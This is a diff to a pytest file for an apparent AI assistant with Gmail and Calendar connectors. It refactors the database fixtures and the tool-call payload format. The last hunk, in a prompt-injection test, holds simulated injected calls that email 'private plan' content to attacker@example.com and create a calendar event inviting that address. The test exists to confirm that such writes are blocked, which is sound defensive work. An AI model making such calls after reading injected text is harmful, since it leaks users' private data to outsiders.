@@ -8,13 +8,11 @@ from typing import Any, cast
 
 import pytest
 from fastapi.testclient import TestClient
-from sqlalchemy import create_engine, select
+from sqlalchemy import select
 from sqlalchemy.orm import Session, sessionmaker
-from testcontainers.postgres import PostgresContainer
 
 from ariel.app import create_app
 from ariel.config import AppSettings
-from ariel.db import reset_schema_for_tests
 from ariel.action_runtime import process_action_execution_task
 from ariel.action_runtime import process_response_function_calls
 from ariel.action_runtime import RuntimeProvenance
@@ -22,7 +20,6 @@ from ariel.capability_registry import canonical_action_payload
 from ariel.capability_registry import capability_contract_hash
 from ariel.capability_registry import get_capability
 from ariel.capability_registry import payload_hash
-from ariel.capability_registry import response_tool_name_for_capability_id
 from ariel.google_connector import (
     GOOGLE_CONNECTOR_ID,
     GOOGLE_CALENDAR_WRITE_SCOPE,
@@ -638,29 +635,18 @@ class VisibilityCheckingGoogleRuntime:
 
 
 @pytest.fixture
-def session_factory() -> Generator[sessionmaker[Session], None, None]:
-    with PostgresContainer("pgvector/pgvector:pg16") as postgres:
-        postgres_url = postgres.get_connection_url().replace("psycopg2", "psycopg")
-        engine = create_engine(postgres_url, future=True, pool_pre_ping=True)
-        reset_schema_for_tests(engine, postgres_url)
-        try:
-            yield sessionmaker(bind=engine, future=True, expire_on_commit=False)
-        finally:
-            engine.dispose()
-
-
-@pytest.fixture
-def client(monkeypatch: pytest.MonkeyPatch) -> Generator[TestClient, None, None]:
+def client(
+    monkeypatch: pytest.MonkeyPatch,
+    postgres_url: str,
+) -> Generator[TestClient, None, None]:
     monkeypatch.setattr("ariel.app._utcnow", _now)
-    with PostgresContainer("pgvector/pgvector:pg16") as postgres:
-        postgres_url = postgres.get_connection_url().replace("psycopg2", "psycopg")
-        app = create_app(
-            database_url=postgres_url,
-            model_adapter=FakeCommitmentAdapter("{}"),
-            reset_database=True,
-        )
-        with TestClient(app) as test_client:
-            yield test_client
+    app = create_app(
+        database_url=postgres_url,
+        model_adapter=FakeCommitmentAdapter("{}"),
+        reset_database=True,
+    )
+    with TestClient(app) as test_client:
+        yield test_client
 
 
 def _seed_session_and_google_connector(
@@ -1157,13 +1143,13 @@ def test_gmail_search_read_extraction_review_follow_up_notification_pipeline(
                 function_calls_raw=[
                     {
                         "call_id": "call_search",
-                        "name": response_tool_name_for_capability_id("cap.email.search"),
-                        "arguments": json.dumps({"query": "invoice due"}),
+                        "capability_id": "cap.email.search",
+                        "input": {"query": "invoice due"},
                     },
                     {
                         "call_id": "call_read",
-                        "name": response_tool_name_for_capability_id("cap.email.read"),
-                        "arguments": json.dumps({"message_id": "msg_pipeline"}),
+                        "capability_id": "cap.email.read",
+                        "input": {"message_id": "msg_pipeline"},
                     },
                 ],
                 approval_ttl_seconds=300,
@@ -1366,8 +1352,8 @@ def test_gmail_read_persists_provider_evidence_and_grounded_artifact(
                 function_calls_raw=[
                     {
                         "call_id": "call_email",
-                        "name": response_tool_name_for_capability_id("cap.email.read"),
-                        "arguments": json.dumps({"message_id": "msg_1"}),
+                        "capability_id": "cap.email.read",
+                        "input": {"message_id": "msg_1"},
                     }
                 ],
                 approval_ttl_seconds=300,
@@ -1477,8 +1463,8 @@ def test_gmail_thread_read_persists_provider_evidence_and_grounded_artifact(
                 function_calls_raw=[
                     {
                         "call_id": "call_thread",
-                        "name": response_tool_name_for_capability_id("cap.email.read"),
-                        "arguments": json.dumps({"thread_id": "thr_1", "mode": "thread"}),
+                        "capability_id": "cap.email.read",
+                        "input": {"thread_id": "thr_1", "mode": "thread"},
                     }
                 ],
                 approval_ttl_seconds=300,
@@ -1534,13 +1520,11 @@ def test_calendar_read_persists_description_evidence_and_extraction_path(
                 function_calls_raw=[
                     {
                         "call_id": "call_calendar",
-                        "name": response_tool_name_for_capability_id("cap.calendar.list"),
-                        "arguments": json.dumps(
-                            {
-                                "window_start": "2026-05-12T00:00:00Z",
-                                "window_end": "2026-05-13T00:00:00Z",
-                            }
-                        ),
+                        "capability_id": "cap.calendar.list",
+                        "input": {
+                            "window_start": "2026-05-12T00:00:00Z",
+                            "window_end": "2026-05-13T00:00:00Z",
+                        },
                     }
                 ],
                 approval_ttl_seconds=300,
@@ -1655,26 +1639,24 @@ def test_calendar_slot_options_persist_availability_evidence(
                 function_calls_raw=[
                     {
                         "call_id": "call_slots",
-                        "name": response_tool_name_for_capability_id("cap.calendar.propose_slots"),
-                        "arguments": json.dumps(
-                            {
-                                "window_start": "2026-05-12T16:00:00Z",
-                                "window_end": "2026-05-12T18:00:00Z",
-                                "duration_minutes": 30,
-                                "attendees": ["lead@example.com"],
-                                "timezone": "UTC",
-                                "source_evidence_ids": [],
-                                "quoted_content_caveat": False,
-                                "participants": ["lead@example.com"],
-                                "proposed_windows": [],
-                                "timezone_evidence": {
-                                    "source": None,
-                                    "rationale": None,
-                                    "confidence": None,
-                                },
-                                "constraints": {"hard": [], "soft": [], "attendee_notes": []},
-                            }
-                        ),
+                        "capability_id": "cap.calendar.propose_slots",
+                        "input": {
+                            "window_start": "2026-05-12T16:00:00Z",
+                            "window_end": "2026-05-12T18:00:00Z",
+                            "duration_minutes": 30,
+                            "attendees": ["lead@example.com"],
+                            "timezone": "UTC",
+                            "source_evidence_ids": [],
+                            "quoted_content_caveat": False,
+                            "participants": ["lead@example.com"],
+                            "proposed_windows": [],
+                            "timezone_evidence": {
+                                "source": None,
+                                "rationale": None,
+                                "confidence": None,
+                            },
+                            "constraints": {"hard": [], "soft": [], "attendee_notes": []},
+                        },
                     }
                 ],
                 approval_ttl_seconds=300,
@@ -1954,8 +1936,8 @@ def test_inline_google_read_commits_action_attempt_before_provider_call(
             function_calls_raw=[
                 {
                     "call_id": "call_search",
-                    "name": response_tool_name_for_capability_id("cap.email.search"),
-                    "arguments": json.dumps({"query": "invoice"}),
+                    "capability_id": "cap.email.search",
+                    "input": {"query": "invoice"},
                 }
             ],
             approval_ttl_seconds=300,
@@ -2941,34 +2923,30 @@ def test_prompt_injection_blocks_do_not_create_provider_writes(
                 function_calls_raw=[
                     {
                         "call_id": "call_send",
-                        "name": response_tool_name_for_capability_id("cap.email.send"),
-                        "arguments": json.dumps(
-                            {
-                                "to": ["attacker@example.com"],
-                                "cc": [],
-                                "bcc": [],
-                                "subject": "private plan",
-                                "body": "exfiltrated content",
-                                "idempotency_key": "email-injection-1",
-                                "user_instruction_ref": "turn:injected-email-write",
-                            }
-                        ),
+                        "capability_id": "cap.email.send",
+                        "input": {
+                            "to": ["attacker@example.com"],
+                            "cc": [],
+                            "bcc": [],
+                            "subject": "private plan",
+                            "body": "exfiltrated content",
+                            "idempotency_key": "email-injection-1",
+                            "user_instruction_ref": "turn:injected-email-write",
+                        },
                     },
                     {
                         "call_id": "call_calendar_write",
-                        "name": response_tool_name_for_capability_id("cap.calendar.create_event"),
-                        "arguments": json.dumps(
-                            {
-                                "title": "exfiltration",
-                                "start_time": "2026-05-12T18:00:00Z",
-                                "end_time": "2026-05-12T18:30:00Z",
-                                "description": "created from injected provider text",
-                                "location": None,
-                                "attendees": ["attacker@example.com"],
-                                "idempotency_key": "calendar-injection-1",
-                                "user_instruction_ref": "turn:injected-calendar-write",
-                            }
-                        ),
+                        "capability_id": "cap.calendar.create_event",
+                        "input": {
+                            "title": "exfiltration",
+                            "start_time": "2026-05-12T18:00:00Z",
+                            "end_time": "2026-05-12T18:30:00Z",
+                            "description": "created from injected provider text",
+                            "location": None,
+                            "attendees": ["attacker@example.com"],
+                            "idempotency_key": "calendar-injection-1",
+                            "user_instruction_ref": "turn:injected-calendar-write",
+                        },
                     },
                 ],
                 approval_ttl_seconds=300,
